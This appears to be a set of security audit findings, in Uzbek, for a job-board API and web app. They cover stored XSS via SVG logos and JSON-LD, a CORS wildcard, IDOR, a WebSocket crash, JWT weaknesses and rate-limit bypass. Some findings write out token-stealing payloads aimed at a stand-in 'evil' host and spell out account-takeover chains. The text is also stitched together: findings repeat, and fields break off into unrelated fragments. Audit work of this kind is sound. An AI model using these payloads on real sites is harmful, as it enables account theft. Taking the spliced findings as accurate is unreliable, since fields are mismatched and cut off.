title: GET /api/vacancies/:id/applications nomzodning TO'LIQ User yozuvini (passwordHash, telegramChatId) qaytaradi
root_cause: `jobSeeker: { include: { jobSeekerProfile: true } }` — `select` emas, `include`. Prisma User modelining barcha skalyar maydonlari (passwordHash, telegramChatId, isBlocked, isEmailVerified...) javobga tushadi. Shu faylning 152–167-qatorlaridagi /api/employer/applications esa to'g'ri `select` ishlatadi. Frontend bu endpoint'ni chaqirmaydi (apps/web/src/lib grep: yo'q), lekin backend'da ochiq.
impact: Vakansiya egasi (yoki admin) o'z vakansiyasiga ariza yuborgan har bir nomzodning argon2 parol hash'i va Telegram chat ID'sini oladi. Hash offline brute-force'ga, chatId esa Telegram spam/identifikatsiyaga yo'l ochadi. Employer o'z arizachilari uchun buni ko'ra oladi — resurs egaligi tekshirilgan, lekin maydonlar chegaralanmagan.
evidence: applications.routes.ts:201-205: `include: { resume: true, jobSeeker: { include: { jobSeekerProfile: true } } }`; schema.prisma:164 `passwordHash String`, :173 `telegramChatId String?`.
recommended_fix: `jobSeeker: { select: { id: true, email: true, phone: true, jobSeekerProfile: { select: { firstName, lastName, headline, avatarUrl, isOpenToWork, resumeUrl, region: { select: { name, slug } } } } } }` — /api/employer/applications (152–167) bilan bir xil whitelist. Yoki endpoint ishlatilmasa umuman olib tashlash. e2e-check.mjs ga `"passwordHash" in item.jobSeeker` bo'lmasligi tekshiruvini qo'shish.
dependencies: Yo'q. e2e-check.mjs:350 testi mavjud — unga maydon tekshiruvi qo'shiladi.

title: Kompaniya logosi sifatida SVG qabul qilinadi → API origin'da stored XSS → refresh cookie orqali access token o'g'irlash zanjiri
root_cause: LOGO_MIME_EXT (15–20) `image/svg+xml` ni qabul qiladi, fayl o'zgarishsiz `/uploads/` ga yoziladi (139–141) va fastify-static orqali API origin'idan beriladi (server.ts:195). API CSP `scriptSrc: 'self' 'unsafe-inline'` (server.ts:151) — SVG ichidagi inline `<script>` to'g'ridan-to'g'ri ochilganda ishlaydi. Refresh cookie API domenida, path `/api/auth`, prod'da SameSite=None (auth.routes.ts:198–203); `POST /api/auth/refresh` cookie bilan yangi accessToken qaytaradi (235–249). Maqola muqovasi (articles.admin.routes.ts:101–105) ataylab SVG'ni rad etadi — bu yerda unutilgan.
impact: Har qanday employer (telefon tasdiqsiz, bepul ro'yxatdan o'tgan) zararli SVG yuklaydi; jabrlanuvchi (masalan admin) `https://api.../uploads/company-logo-*.svg` havolasini ochsa skript API origin'ida `fetch('/api/auth/refresh', {credentials:'include'})` orqali uning access tokenini oladi va `img` orqali (CSP imgSrc https:) tashqariga yuboradi. Hisob egallash zanjiri (admin ham).
evidence: companies.routes.ts:19 `"image/svg+xml": "svg"`; :141 `pipeline(data.file, fs.createWriteStream(dest))` — sanitizatsiya yo'q; server.ts:151 `scriptSrc: ["'self'", "'unsafe-inline'", ...]`; server.ts:195 `fastifyStatic { root: UPLOAD_DIR, prefix: "/uploads/" }`; auth.routes.ts:202 `path: "/api/auth"`.
recommended_fix: Minimal: LOGO_MIME_EXT dan `image/svg+xml` ni olib tashlash (muqova bilan bir xil). Qo'shimcha himoya: `/uploads/` javoblariga `Content-Security-Policy: sandbox; default-src 'none'` va `X-Content-Type-Options: nosniff` (fastifyStatic `setHeaders`) — kelajakdagi har qanday fayl turi uchun. Mavjud .svg logolarni rasterga o'tkazish yoki o'chirish.
dependencies: Frontend logo yuklash formasi (accept atributi) — SVG'ni ro'yxatdan olib tashlash.
fix_risk: Past — SVG logolar demo/seed'da bo'lsa ular yangilanadi.

title: Ariza yuborishda body.resumeId egasi tekshirilmaydi: begona rezyumeni biriktirib o'qish mumkin (IDOR)
root_cause: applySchema ixtiyoriy `resumeId` qabul qiladi. U berilsa, rezyume joriy nomzodga tegishliligi tekshirilmaydi va to'g'ridan-to'g'ri Application.resumeId'ga yoziladi (57-64).
impact: Hujumchi o'zining employer hisobida vakansiya ochadi (limit yo'q) va nomzod hisobidan boshqa odamning resumeId'si bilan ariza yuboradi. Keyin /api/employer/applications (168-174) orqali o'sha rezyumeni tajriba, ta'lim va ko'nikmalari bilan to'liq o'qiydi, jumladan isOpenToWork=false nomzodlarniki ham. ObjectId bitta jarayonda ketma-ket hosil bo'ladi, shuning uchun ID'larni taxmin qilish mumkin.
evidence: applications.routes.ts:39-49 `let resumeId = body.resumeId; if (!resumeId && !vacancy.applyWithoutResume) {...}`; 57-64 `data: { vacancyId, jobSeekerId: req.user!.sub, resumeId, ... }`. Tekshiruv yo'q.
recommended_fix: body.resumeId berilsa, `prisma.resume.findFirst({ where: { id: body.resumeId, jobSeeker: { userId: req.user!.sub } } })` bilan tekshirish, topilmasa 404/400. Frontend resumeId yubormaydi (api.ts:173-175), shuning uchun maydonni sxemadan butunlay olib tashlash ham mumkin.
dependencies: Yo'q

title: WS xabarida noto'g'ri conversationId async handler'da unhandled rejection beradi: server yiqilishi mumkin (DoS)
root_cause: `ws.on("message", async ...)` ichida conversationId ObjectId sifatida tekshirilmaydi va participantsOf() → prisma.findUnique({ id }) ga uzatiladi. MongoDB provider noto'g'ri ObjectId'da xato tashlaydi (Malformed ObjectID). Handler'da try/catch yo'q, apps/api/src'da process.on('unhandledRejection') ham topilmadi. Node 20 odatda unhandled rejection'da jarayonni to'xtatadi.
impact: Istalgan tizimga kirgan foydalanuvchi /ws/chat'ga {"type":"read","conversationId":"x"} yuborib API jarayonini qulatishi mumkin. Shuningdek WS orqali xabar yuborishda requirePhoneVerified va isBlocked tekshiruvlari yo'q (REST /start'da bor).
evidence: chat.routes.ts:83-94: ws.on("message", async (raw) => { ... const conversationId = String(data.conversationId ?? ""); if (!conversationId) return; const parts = await participantsOf(conversationId); ...}); grep unhandledRejection apps/api/src → natija yo'q.
recommended_fix: Handler tanasini try/catch'ga o'rash va conversationId'ni OBJECT_ID_RE bilan tekshirish (common/validation.js). Yuborishdan oldin foydalanuvchi isPhoneVerified && !isBlocked ekanini bir marta (ulanishda) tekshirish. server.ts'ga log qiluvchi process.on('unhandledRejection') qo'shish.
dependencies: common/validation.ts OBJECT_ID_RE

title: SVG logo orqali API origin'da stored XSS: refresh cookie bilan accessToken o'g'irlanadi
root_cause: Logo yuklashda image/svg+xml qabul qilinadi (LOGO_MIME_EXT, 19-qator). Fayl @fastify/static orqali API origin'ning o'zidan beriladi (server.ts:107). API'dagi helmet CSP scriptSrc'da 'unsafe-inline' bor (server.ts:62), shuning uchun SVG ichidagi inline <script> bajariladi.
impact: Employer (ro'yxatdan o'tish bepul) script'li SVG yuklaydi. Qurbon /uploads/company-logo-*.svg havolasini ochsa (masalan chatda yuborilgan bo'lsa), script API origin'da same-origin POST /api/auth/refresh chaqiradi. refreshToken cookie (path /api/auth, prod'da SameSite=None) yuboriladi, javobda accessToken qaytadi va hisob egallanadi. Nomzod, employer va admin hisoblariga birdek ta'sir qiladi.
evidence: companies.routes.ts:15-20 "image/svg+xml": "svg"; server.ts:62 scriptSrc: ["'self'", "'unsafe-inline'"...]; server.ts:107 fastifyStatic root: UPLOAD_DIR, prefix "/uploads/"; auth.routes.ts:74-81 refresh javobi { accessToken }; api.ts:148-158 json.accessToken o'qiladi.
recommended_fix: Minimal yechim: LOGO_MIME_EXT'dan svg'ni olib tashlash. Mavjud .svg fayllar uchun /uploads javoblariga `Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; sandbox` va `Content-Disposition: attachment` qo'yish (fastifyStatic setHeaders), yoki SVG'ni sanitize qilish. Yana: upload'larda magic-bytes tekshiruvi.
dependencies: server.ts fastifyStatic setHeaders; mavjud SVG logolar migratsiyasi (PNG'ga aylantirish yoki o'chirish)
fix_risk: Past: SVG logolar endi yuklanmaydi, mavjud SVG'lar orqali ko'rinishda davom etadi (CSP header img render'iga ta'sir qilmaydi).

Endpoint ishlatilmayotgan bo'lsa, uni butunlay olib tashlash ham mumkin.

title: GET /api/vacancies/:id/applications nomzodning to'liq User yozuvini, jumladan passwordHash'ni qaytaradi
root_cause: `include: { resume: true, jobSeeker: { include: { jobSeekerProfile: true } } }` ishlatilgan, `select` yo'q. Server'da javobdan maxfiy maydonlarni olib tashlaydigan serializer yoki hook yo'q (grep passwordHash faqat yozish joylarida uchradi).
impact: Har bir ish beruvchi o'z vakansiyasiga ariza bergan nomzodlarning argon2 hash'ini, telegramChatId'sini va ichki flag'larini oladi. Bu credential leak: offline brute-force va ma'lumotning ruxsatsiz ochilishi (product rule 3).

title: Kompaniya logosi sifatida SVG qabul qilinadi va API origin'dan inline script'ga ruxsat bilan beriladi (stored XSS)
root_cause: LOGO_MIME_EXT'da `image/svg+xml` bor, fayl mazmuni tozalanmaydi. `/uploads/` @fastify/static orqali API origin'dan beriladi (server.ts:107). Global helmet CSP'da `scriptSrc: ['self', 'unsafe-inline']` (server.ts:63), shuning uchun SVG ichidagi `<script>` yoki `onload` fayl to'g'ridan-to'g'ri ochilganda ishlaydi.
impact: Employer `<svg onload=...>` yuklaydi. Kimdir logo URL'ini ochsa (havola, 'rasmni yangi tabda ochish'), script API origin'da ishlaydi: same-origin `POST /api/auth/refresh` refresh cookie bilan ketadi (auth.routes.ts:74-82) va accessToken qaytadi. Natija: hisobni egallab olish, admin hisobi ham bo'lishi mumkin.
evidence: companies.routes.ts:15-20 (svg ruxsat), 135-141 (faqat mimetype tekshiriladi, u client'dan keladi), server.ts:58-66 CSP 'unsafe-inline', server.ts:107 static uploads, auth.routes.ts:74-82 refresh token'ni JSON'da qaytaradi.
recommended_fix: Minimal yechim: LOGO_MIME_EXT'dan `image/svg+xml`ni olib tashlash (PNG/JPG/WebP qoladi). Frontend hint matnidagi 'SVG'ni ham olib tashlash kerak (api.ts:668 izohi, i18n logoHint). Qo'shimcha: `/uploads/` uchun `Content-Security-Policy: sandbox; default-src 'none'` va `X-Content-Type-Options: nosniff` header'larini setHeaders orqali qo'yish.
dependencies: Oldin yuklangan .svg logolar diskda qoladi. Ularni yuqoridagi sandbox header bilan berish yoki migratsiya qilish kerak.
fix_risk: Past: SVG logolar endi yuklanmaydi, xolos.

title: WS 'message' handler'da try/catch yo'q — noto'g'ri conversationId bilan Prisma xatosi unhandled rejection → jarayon o'chadi
root_cause: `ws.on("message", async …)` (83-134) ichida `participantsOf(conversationId)` (92) `String(data.conversationId)` ni validatsiyasiz `prisma.conversation.findUnique({where:{id}})` ga beradi. MongoDB provider'da 24-hex bo'lmagan id → PrismaClientKnownRequestError P2023 uloqtiriladi. Handler async va hech kim promise'ni ushlamaydi; server.ts'da faqat `process.on(signal)` (210) bor, `unhandledRejection` handler yo'q → Node 20 default rejimida jarayon crash bo'ladi. Xuddi shu yo'l 99, 111 (DB uzilishi) uchun ham amal qiladi.
impact: Har qanday autentifikatsiyalangan foydalanuvchi bitta `{"conversationId":"x"}` frame bilan butun API'ni (chat, REST, Telegram bot) o'chirib qo'yadi — DoS. DB vaqtincha uzilsa ham har WS xabar crash'ga olib keladi.
evidence: chat.routes.ts:83-134 (async handler, catch faqat JSON.parse atrofida), :90-92 (validatsiyasiz id), server.ts:210 (faqat signal handler), `grep process.on` — boshqa handler yo'q.
recommended_fix: 1) `conversationId` ni `/^[a-f0-9]{24}$/` bilan tekshirib, mos kelmasa return; 2) handler tanasini `try { … } catch (e) { req.log.warn(e) }` ga o'rash; 3) server.ts'ga `process.on("unhandledRejection", (e) => app.log.error(e))` qo'shish (himoya qatlami).
dependencies: server.ts global handler #3 topilma bilan umumiy

title: SVG logo yuklash + /uploads/ API origin'ida inline bo'lib ochiladi + CSP script-src 'unsafe-inline' → SVG ichidagi <script> refresh cookie bilan access token oladi (account takeover)
root_cause: LOGO_MIME_EXT'da `"image/svg+xml": "svg"` (companies.routes.ts:19), mimetype faqat client sarlavhasidan (:135), fayl tarkibi tekshirilmaydi. Fayl `@fastify/static` orqali `/uploads/<nom>.svg` sifatida `Content-Type: image/svg+xml`, Content-Disposition'siz (server.ts:107) beriladi. Helmet global (onRequest) — /uploads/ ga ham CSP `script-src 'self' 'unsafe-inline'` (server.ts:63) qo'llanadi, ya'ni SVG ichidagi inline <script> bloklanmaydi. Refresh cookie `path: /api/auth`, httpOnly — lekin SVG API origin'ida ishlagani uchun same-origin `fetch('/api/auth/refresh',{credentials:'include'})` cookie bilan ketadi va accessToken JSON o'qiladi; `img-src https:` (server.ts:66) orqali `new Image().src='https://evil/?t='+token` bilan chiqarib yuboriladi.
impact: Har qanday employer (telefon tasdiqlash ham shart emas — logo route'da requirePhoneVerified yo'q) zararli SVG yuklab, havolani chat/vakansiya tavsifi/tashqi joyda tarqatadi; havolani ochgan har qanday kirgan foydalanuvchi (admin ham) hisobini yo'qotadi. Admin logo URL'ni admin panelda ko'rsa ham `` orqali — xavfsiz; xavf faqat to'g'ridan-to'g'ri navigatsiyada, lekin bu yetarli.
evidence: companies.routes.ts:15-20 LOGO_MIME_EXT; :135 `const ext = LOGO_MIME_EXT[data.mimetype];`; :139-141 faylni tekshirmasdan yozadi. server.ts:107 `fastifyStatic({ root: UPLOAD_DIR, prefix: "/uploads/" })` — setHeaders yo'q. server.ts:58-84 helmet global, :63 `scriptSrc: ["'self'", "'unsafe-inline'", ...]`, :66 `imgSrc: [... "https:"]`. auth.routes.ts:41 `path: "/api/auth"` (same-origin so'rovda mos keladi). @fastify/helmet/index.js:36,54 — onRequest hook, global=true.
recommended_fix: (1) Minimal: `/uploads/` uchun `setHeaders: (res) => { res.setHeader('Content-Security-Policy', "default-src 'none'; sandbox; style-src 'unsafe-inline'"); res.setHeader('X-Content-Type-Options','nosniff'); }` — sandbox origin'ni null qiladi, script ishlamaydi, cookie ketmaydi. (2) SVG'ni yuklashda tekshirish: faylni buferga o'qib `/<script|on[a-z]+\s*=|javascript:|<foreignObject|<use[^>]+href\s*=\s*["']?(?!#)/i` uchrasa rad etish, yoki SVG'ni umuman qabul qilmaslik (articles cover'dagidek, articles.admin.routes.ts:42-46 izohida shu sabab yozilgan). (3) Fayl boshidagi magic-bytes (PNG 89504E47, JPEG FFD8FF, WebP RIFF..WEBP, PDF %PDF-) tekshiruvi — mimetype sarlavhasiga ishonmaslik. (4) Ideal: uploads'ni alohida cookie'siz domen/CDN'dan berish.
dependencies: server.ts fastifyStatic ro'yxati; profile.routes.ts PDF va articles cover ham shu setHeaders'dan foyda ko'radi
fix_risk: Sandbox CSP bilan va og:image ishlashda davom etadi; SVG'ni rad etsangiz mavjud SVG logolar o'zgarmaydi (backward compatible), faqat yangi yuklash cheklanadi

title: CORS credentials:true + har qanday *.vercel.app origin'ga ruxsat → istalgan Vercel sayti refresh cookie bilan access token oladi
root_cause: `VERCEL_PREVIEW = /^https:\/\/[a-z0-9-]+\.vercel\.app$/i` (server.ts:90) va `origin(...)` callback'i (server.ts:97) shu naqshga mos HAR QANDAY origin'ni qabul qiladi, `credentials: true` (server.ts:100). vercel.app — ommaviy hosting: hujumchi o'z loyihasini `https://evil-abc.vercel.app` da bepul deploy qiladi. Refresh cookie prod'da `sameSite: none; secure` (auth.routes.ts:37-42), shuning uchun brauzer uni cross-site fetch'ga qo'shadi.
impact: Hisobni to'liq egallash (account takeover): jabrlanuvchi ISH BOR!'ga kirgan holda hujumchi vercel.app sahifasini ochsa, sahifa `fetch(API+'/api/auth/refresh',{method:'POST',credentials:'include'})` qiladi → brauzer cookie'ni yuboradi, ACAO=hujumchi origin, ACAC=true → javobdagi `accessToken` o'qiladi va hujumchiga ketadi. 15 daqiqalik access token + har 12 daqiqada yangilash imkoni (cookie hali ham hujumchida ishlaydi). Admin hisoblari ham.
evidence: server.ts:90 `const VERCEL_PREVIEW = /^https:\/\/[a-z0-9-]+\.vercel\.app$/i;` server.ts:97 `if (allowedOrigins.includes(origin) || VERCEL_PREVIEW.test(origin)) return cb(null, true);` server.ts:100 `credentials: true`. auth.routes.ts:39-40 `sameSite: (isProd ? "none" : "lax")`, `secure: isProd`. auth.routes.ts:74-88 `/api/auth/refresh` cookie'dan token o'qib yangi accessToken JSON qaytaradi. .env.example: "Vercel'ning *.vercel.app preview domenlariga ruxsat avtomatik bor".
recommended_fix: Naqshni loyiha nomiga bog'lang: `VERCEL_PREVIEW = /^https:\/\/ishbor(-[a-z0-9-]+)?\.vercel\.app$/` yoki env'da `VERCEL_PROJECT_SLUG` / `CORS_PREVIEW_PATTERN` bo'lib, faqat `<project>-<hash>-<team>.vercel.app` shakli o'tsin. Yana ham yaxshisi: prod'da preview'larga umuman credentials bermaslik (`credentials: allowedOrigins.includes(origin)`), preview'lar uchun `CORS_EXTRA_ORIGINS` ga qo'lda qo'shish. Qo'shimcha himoya: `/api/auth/refresh` da `Origin`/`Sec-Fetch-Site` sarlavhasini allowedOrigins bilan qat'iy tekshirish.
dependencies: CORS_EXTRA_ORIGINS/WEB_ORIGIN sozlamasi (env.ts:105-111); DEPLOY.md hujjatini yangilash
fix_risk: Vercel preview deploylarida API chaqiruvlari ishlamay qolishi mumkin — preview URL naqshini aniq belgilash kerak

title: JSON-LD `JSON.stringify` ichida `</script>` escape qilinmaydi — employer kiritgan vakansiya sarlavhasi/kompaniya nomi orqali SSR HTML'ga stored XSS
root_cause: `dangerouslySetInnerHTML={{ __html: JSON.stringify(data) }}` — JSON.stringify `<`, `>`, `/` ni escape qilmaydi; sarlavhada `</script><script>...` bo'lsa HTML parser <script type=ld+json>'ni yopib, keyingisini ishga tushiradi. `vacancy.title` (detail.ts:179 `str(raw?.title)`) va `company.name` (detail.ts:213) hech qanday teg tozalashsiz jobLd/breadcrumbLd'ga kiradi (vacancies/@slug/+Head.tsx:48,56,69), companies/@slug/+Head.tsx:36,44 ham. Backend'da title/company name uchun HTML filtri yo'q (vacancies.routes.ts:42 `title: z.string().min(3)`, companies.routes.ts:32 `name`). Web origin'da CSP umuman yo'q (vercel.json:232-245, server/index.mjs:40-45).
impact: Employer vakansiya sarlavhasini `X</script><script>fetch('https://evil/?t='+localStorage['ish-top:accessToken'])</script>` qilib joylaydi (moderatsiyadan o'tgach — yoki `status: active` bilan to'g'ridan-to'g'ri, vacancies.routes.ts:71 buni ruxsat etadi). Sahifani ochgan har bir kirgan foydalanuvchining access tokeni (localStorage, AuthContext.tsx:16) o'g'irlanadi; admin ham. Vakansiya ro'yxati (vacancies/+Head.tsx:32 listLd) orqali ham tarqaladi.
evidence: JsonLd.tsx:9 `<script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(data) }} />`. vacancies/@slug/+Head.tsx:56 `title: vacancy.title`, :48 breadcrumb `name: vacancy.title`, :69 `name: company.name`. detail.ts:81-83 `str()` faqat trim; :179 `const title = str(raw?.title) ?? ""` (plainText yo'q). companies/@slug/+Head.tsx:44 `name: company.name`. vercel.json:232-245 — CSP yo'q.
recommended_fix: JsonLd.tsx: `JSON.stringify(data).replace(/</g, '\\u003c').replace(/>/g, '\\u003e').replace(/&/g, '\\u0026').replace(/\u2028/g,'\\u2028').replace(/\u2029/g,'\\u2029')` — JSON semantikasi saqlanadi, HTML parser uchun xavfsiz. ""); ... const parts = await participantsOf(conversationId);`; :14-18 `prisma.conversation.findUnique({ where: { id: conversationId } ...`; server.ts'da unhandledRejection handler yo'q; validation.ts'da `isObjectId` bor, lekin bu yerda ishlatilmagan.

title: JWT secret minimal 8 belgi va algoritm pin qilinmagan — HS256 secret offline brute-force bilan admin token yasash mumkin
root_cause: env.ts:456-457 `JWT_ACCESS_SECRET: z.string().min(8)`; .env.example:17-18 ham 8 belgilik lug'at so'zlari misol qilib bergan. jwt.ts:369,373 `jwt.verify(token, secret)` `algorithms` opsiyasiz — HS256/HS384/HS512 hammasi qabul qilinadi. Access va refresh payload'larida `typ`/`aud` farqi yo'q (jwt.ts:360-366): ikki secret bir xil qo'yilsa refresh token requireAuth'dan o'tadi (role undefined).

evidence: apps/api/src/common/env.ts:456-457; apps/api/src/common/jwt.ts:360-374; apps/api/.env.example:17-18; apps/api/src/common/auth-guard.ts:399-404 (rol faqat tokendan).
recommended_fix: env.ts: `.min(32)` (prod'da) + startup'da access≠refresh tekshiruvi; .env.example'da `openssl rand -base64 48` ko'rsatmasi. jwt.ts: sign'da `{ algorithm: "HS256" }`, verify'da `{ algorithms: ["HS256"] }`; access'ga `typ: "access"`, refresh'ga `typ: "refresh"` claim qo'shib verify'da tekshirish. Deploy hujjatida (DEPLOY.md) secret talabini yozish.
dependencies: e2e-check.mjs:72 test secretlari 32+ belgiga o'zgartirilishi kerak; mavjud prod secret qisqa bo'lsa rotatsiya = barcha foydalanuvchilar qayta kiradi.
fix_risk: O'rta: secret rotatsiyasi seanslarni uzadi (bir martalik); algoritm pin mavjud HS256 tokenlarga ta'sir qilmaydi.

title: Telegram deep-link login bir klik bilan phishing orqali hisob egallashga ochiq
root_cause: POST /api/auth/telegram/start (auth.routes.ts:103-113) hech qanday autentifikatsiyasiz `lg<token>` deep-link yaratadi. handleLoginStart (telegram.service.ts:112-131) havolani kim bosgan bo'lsa, o'sha chatga bog'langan userId'ni tokenga yozadi va hech qanday tasdiq so'ramaydi. Xuddi shu naqsh link-token'da ham bor: hujumchi o'z hisobi uchun /api/telegram/link yaratib havolani jabrlanuvchiga yuborsa, jabrlanuvchining Telegram'i hujumchi hisobiga bog'lanadi (telegram.service.ts:196-207), keyin kontakt ulashsa hujumchi hisobiga TASDIQLANGAN telefon yoziladi (227-237).

Link-token varianti — begona odamning telefonini o'z hisobiga tasdiqlash (requirePhoneVerified'ni aylanib o'tish, soxta profil).
evidence: auth.routes.ts:103-124 (start auth'siz, poll natijani beradi); telegram.service.ts:118-130 (`entry.status = "confirmed"; entry.userId = user.id` tasdiqsiz); telegram.service.ts:203-207 (`updateMany ... telegramChatId: null` boshqa hisobdan uzib, yangisiga bog'laydi); 233-237 (phone + isPhoneVerified: true).

[Ha] [Yo'q]", callback_data = token) va faqat callback_query'da `confirmed` qiling (allowed_updates ga "callback_query" qo'shing). Qo'shimcha: saytda 2-4 belgili kod ko'rsatib, botdagi xabarda ham shu kodni ko'rsating (foydalanuvchi mosligini ko'radi). Link oqimida ham bot xabarida qaysi email hisobga bog'lanayotganini ko'rsatib, tasdiq tugmasi qo'ying. Deep-link xabarida "Agar buni siz boshlamagan bo'lsangiz — Yo'q" ogohlantirish.

fix_risk: Past: faqat Telegram oqimiga qo'shimcha qadam; email/parol login o'zgarmaydi.

title: trustProxy: true bilan X-Forwarded-For spoofing login brute-force limitini aylanib o'tadi
root_cause: server.ts:446 `trustProxy: true` — Fastify barcha proxylarga ishonib `req.ip` ni XFF'dagi ENG CHAP (mijoz yozgan) qiymatdan oladi. @fastify/rate-limit (server.ts:497; auth.routes.ts:55-57 strictRateLimit 10/min) kalit sifatida `req.ip` ishlatadi. Railway o'z IP'sini XFF'ga qo'shadi, lekin mijoz yuborgan qiymatni o'chirmaydi.
impact: Hujumchi har so'rovda tasodifiy `X-Forwarded-For` yuborib /api/auth/login, /register, /google, /staff-invites uchun 10/min chegarani nolga tushiradi -> parol brute-force (parol siyosati faqat min 8, lockout yo'q) va register spam. Global 600/min ham xuddi shunday aylanib o'tiladi.
evidence: apps/api/src/server.ts:446,497; apps/api/src/modules/auth/auth.routes.ts:55-57,60,67,130; apps/api/src/modules/team/team.routes.ts:26,215,221.
recommended_fix: `trustProxy` ni proxy soniga cheklang (Railway uchun `trustProxy: 1` — faqat oxirgi hop) yoki rateLimit `keyGenerator` da XFF'ning O'NG tomonidan 1-chi IP'ni oling. Qo'shimcha: login uchun email bo'yicha ikkinchi kalit (masalan `${ip}:${email}` yoki in-memory counter, 5 xato -> 15 daqiqa) — IP'dan mustaqil himoya. /api/auth/refresh va /telegram/poll ga ham alohida limit (masalan 60/min) bering (hozir faqat global).
dependencies: Railway/Vercel proxy zanjiri sonini tasdiqlash kerak; e2e-check rate-limit testlari (agar bo'lsa).
fix_risk: O'rta: trustProxy noto'g'ri sozlansa barcha foydalanuvchi bitta proxy IP'ga yig'ilib butun sayt 429 oladi — deploydan keyin `req.ip` ni logda tekshiring.

title: WS /ws/chat: noto'g'ri formatdagi conversationId → Prisma P2023 → unhandled promise rejection → API jarayoni yiqilishi mumkin
root_cause: `ws.on("message", async ...)` (83) ichida `participantsOf(conversationId)` (14–21) `findUnique({ where: { id } })` ni ObjectId tekshiruvisiz chaqiradi. Handler'da try/catch yo'q, Fastify error handler WS event'larga qo'llanmaydi — Node 15+ da unhandled rejection default'da jarayonni to'xtatadi (`process.on('unhandledRejection')` server.ts da yo'q).

evidence: vacancies.service.ts:35 LIST_INCLUDE company: true; 341-356 getVacancyBySlug include company { include ... } (select yo'q); companies.routes.ts:177-199 company to'liq + vacancies include; favorites.routes.ts:31-34 va applications.routes.ts:102-105 salaryMin/salaryMax + isSalaryHidden; chat.routes.ts:289-291 esa to'g'ri null qiladi.

Uni list, detail, similar, company, favorites va applications javoblarida qo'llash. Salary filtr va saralashga `isSalaryHidden: false` qo'shish (Mongo buildFilters va Meili filter; indexda hidden bo'lsa salaryMin=0).

title: GET /api/resume xatosida rezyume bo'sh deb qabul qilinadi, keyingi saqlash butun tajriba/ta'lim/ko'nikmalarni o'chiradi
root_cause: fetchResume xatoda ham null qaytaradi (api.ts:537-542). load() profil muvaffaqiyatli bo'lsa status="ready" qo'yadi va resumeRef.current=null qoladi (66-77). saveResume esa `{ ...EMPTY_RESUME, ...(resumeRef.current ?? {}), ...patch }` yuboradi. title: /alerts: API xatosi "Obunalar yo'q" bo'sh holati bo'lib ko'rinadi

title: Employer bosh sahifa, /vacancies va /companies'dan pullik /employer/candidates'ga yo'naltiriladi, u yerda 402 bo'sh ro'yxat bo'lib ko'rinadi
root_cause: useRedirectRole("employer", "/employer/candidates"). /api/candidates esa assertCanSearchCandidates bilan tarifga bog'langan: FREE_FALLBACK.canSearchCandidates=false, natijada 402 PLAN_FEATURE_LOCKED. fetchCandidates authGet fallback bilan xatoni [] ga aylantiradi (api.ts:779-782, 715-719).
impact: Product rule 1 (platforma bepul, core flow monetizatsiyaga bog'lanmaydi) va EMPTY≠ERROR buziladi. Har bir employer bosh sahifaga kirganda "nomzodlar topilmadi" degan, aslida tarif bloki bo'lgan sahifaga tushadi.
evidence: index/+Page.tsx:37, vacancies/+Page.tsx:46, companies/+Page.tsx:53 useRedirectRole("employer", "/employer/candidates"); candidates.routes.ts:15-22 assertCanSearchCandidates; billing.service.ts:113 canSearchCandidates: false, 173-178 402; api.ts:716-717 `if (!res || !res.ok) return fallback;`
recommended_fix: Bepul rejim davomida candidates.routes.ts'dan assertCanSearchCandidates chaqiruvini olib tashlash (yoki env flag bilan o'chirish). fetchCandidates'ni xatoni tashlaydigan qilib, sahifada error holatini ko'rsatish. Redirect manzilini /employer/vacancies'ga o'zgartirishni ham ko'rib chiqish.
dependencies: Employer auditi bilan kesishadi; billing izolyatsiyasi

title: Bosh sahifa SSR: API xatosi "0+ vakansiya" va bo'sh bo'limlar bo'lib ko'rinadi
root_cause: fetchStats → EMPTY_STATS (api.ts:498-502), fetchVacancies → { items: [] } (280-288), fetchCompanies → [] (365-372): tarmoq xatosi yoki 5xx'da jim fallback. Sahifada xato holati yo'q, Stat CountUp suffix="+" bilan "0+" chiqadi (+Page.tsx:323). "So'nggi vakansiyalar" va "Kompaniyalar" Section'lari bo'sh grid bilan chiziladi (205-226).
impact: EMPTY ≠ ERROR qoidasi buzilgan. API vaqtincha ishlamasa, SSR sahifa (va qidiruv tizimlari keshi) "platformada 0 vakansiya, 0 kompaniya" ko'rsatadi, xato yoki qayta urinish holati yo'q.
evidence: index/+data.ts:4-13 Promise.all([fetchStats(), fetchVacancies(), fetchCompanies()]); api.ts:500 `if (!res || !res.ok) return EMPTY_STATS;` api.ts:284 `if (!res || !res.ok) return { items: [], total: 0 };` index/+Page.tsx:126-162 Stat value={stats.vacancies}.
recommended_fix: +data'da /vacancies'dagi kabi naqsh: `fetchVacancyPage(...).catch(() => null)` va stats uchun ApiError tashlaydigan variant ishlatib, `null`ni xato deb uzatish. Stats null bo'lsa stat kartasini yashirish, vacancies null bo'lsa bo'limda "yuklab bo'lmadi / qayta urinish" ko'rsatish, bo'sh ro'yxatda esa bo'limni yashirish. "+" suffiksini olib tashlash.
dependencies: api.ts fetchStats/fetchVacancies boshqa joylarda ham ishlatiladi — yangi throw qiluvchi variant qo'shish xavfsizroq

title: Employer nomzodlar qidiruvi hali ham 402 PLAN_FEATURE_LOCKED bilan tarifga bog'langan
root_cause: assertCanSearchCandidates (billing.service.ts:173-182) `plan.canSearchCandidates` false bo'lsa 402 tashlaydi. FREE_FALLBACK va free reja canSearchCandidates=false (billing.service.ts:24, 113).
impact: Obunasi yo'q har bir employer /employer/candidates sahifasida 402 oladi. Platforma bepul bo'lgani uchun deyarli barcha employerlar bloklanadi. Bu product rule 1'ga zid (employer core flow monetizatsiyaga bog'lanmasligi kerak).
evidence: candidates.routes.ts:159-166: `if (req.user!.role !== "admin") { ... await assertCanSearchCandidates(company.id); }`
recommended_fix: Chaqiruvni olib tashlang (yoki feature flag bilan o'chiring). Kompaniya profili mavjudligi tekshiruvi qolsin. Eski billing kodi izolyatsiyada qolishi mumkin.

title: Home stats API xatosida "0 vakansiya / 0 kompaniya / 0 ariza" ko'rinadi (EMPTY ≠ ERROR buzilgan)
root_cause: fetchStats `!res.ok` bo'lsa EMPTY_STATS = {0,0,0} qaytaradi (api.ts:37, 500). index/+Page.tsx:127-152 Stat kartalarini shartsiz chizadi. fetchVacancies (api.ts:284) va fetchCompanies (api.ts:369) ham xatoda bo'sh ro'yxat qaytaradi.
impact: Mongo sekinlashsa yoki API timeout bersa (10k miqyosda /api/stats har SSR'da scan qiladi, pastga qarang), bosh sahifa "0 ta vakansiya" deb ko'rsatadi. Bu to'qima ma'lumot hisoblanadi va product rule 4'ga zid.
